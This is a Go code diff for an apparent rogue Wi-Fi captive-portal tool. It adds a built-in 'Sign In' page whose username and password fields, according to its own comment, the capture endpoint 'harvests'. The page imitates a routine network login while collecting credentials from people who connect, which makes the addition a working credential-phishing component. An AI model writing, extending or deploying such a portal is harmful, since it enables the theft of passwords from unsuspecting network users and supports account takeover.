@@ -298,7 +298,7 @@ func (e *Engine) startHTTPServer() error {
 		if e.PortalHTML != "" {
 			fmt.Fprint(w, e.PortalHTML)
 		} else {
-			renderDefaultPortal(w)
+			renderDefaultPortal(w, e.RequireAuth)
 		}
 	})
 
@@ -364,9 +364,18 @@ func (e *Engine) startHTTPServer() error {
 	return nil
 }
 
-func renderDefaultPortal(w http.ResponseWriter) {
-	tmpl := template.Must(template.New("portal").Parse(defaultPortalHTML))
+func renderDefaultPortal(w http.ResponseWriter, requireAuth bool) {
+	tmpl := template.Must(template.New("portal").Parse(defaultPortal(requireAuth)))
 	_ = tmpl.Execute(w, nil)
+}
+
+// defaultPortal returns the built-in portal: a login form when the network
+// requires authentication, otherwise the accept-only splash.
+func defaultPortal(requireAuth bool) string {
+	if requireAuth {
+		return defaultPortalAuthHTML
+	}
+	return defaultPortalHTML
 }
 
 // isSafeRedirect allows only an http/https absolute URL or a site-relative path.
@@ -420,7 +429,7 @@ func (e *Engine) servePortalBody(w http.ResponseWriter, errMsg string) {
 		html = e.PortalHTML
 	}
 	if html == "" {
-		html = defaultPortalHTML
+		html = defaultPortal(e.RequireAuth)
 	}
 	if errMsg != "" {
 		html = injectError(html, errMsg)
@@ -506,6 +515,44 @@ button:hover { background: #1d4ed8; }
   <form method="POST" action="/portal/accept">
     <input type="hidden" name="redirect" value="http://example.com">
     <button type="submit">Connect to Internet</button>
+  </form>
+</div>
+</body>
+</html>`
+
+// defaultPortalAuthHTML is the built-in portal shown when the network requires
+// authentication: a username/password login whose fields the capture endpoint
+// recognizes and harvests.
+var defaultPortalAuthHTML = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Network Access</title>
+<style>
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  background: #f5f5f5; display: flex; align-items: center; justify-content: center;
+  min-height: 100vh; margin: 0; }
+.card { background: white; border-radius: 12px; padding: 2rem; max-width: 400px;
+  width: 90%; box-shadow: 0 4px 24px rgba(0,0,0,0.1); text-align: center; }
+h1 { font-size: 1.5rem; color: #1a1a1a; margin-bottom: 0.5rem; }
+p { color: #666; font-size: 0.9rem; margin-bottom: 1.5rem; }
+input { width: 100%; box-sizing: border-box; padding: 0.7rem 0.85rem; margin-bottom: 0.85rem;
+  border: 1px solid #d0d0d0; border-radius: 8px; font-size: 1rem; }
+button { background: #2563eb; color: white; border: none; border-radius: 8px;
+  padding: 0.75rem 2rem; font-size: 1rem; cursor: pointer; width: 100%; }
+button:hover { background: #1d4ed8; }
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Sign In</h1>
+  <p>Sign in with your account to connect to the network.</p>
+  <form method="POST" action="/portal/accept">
+    <input type="text" name="username" placeholder="Username or email" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <input type="hidden" name="redirect" value="http://example.com">
+    <button type="submit">Sign In</button>
   </form>
 </div>
 </body>
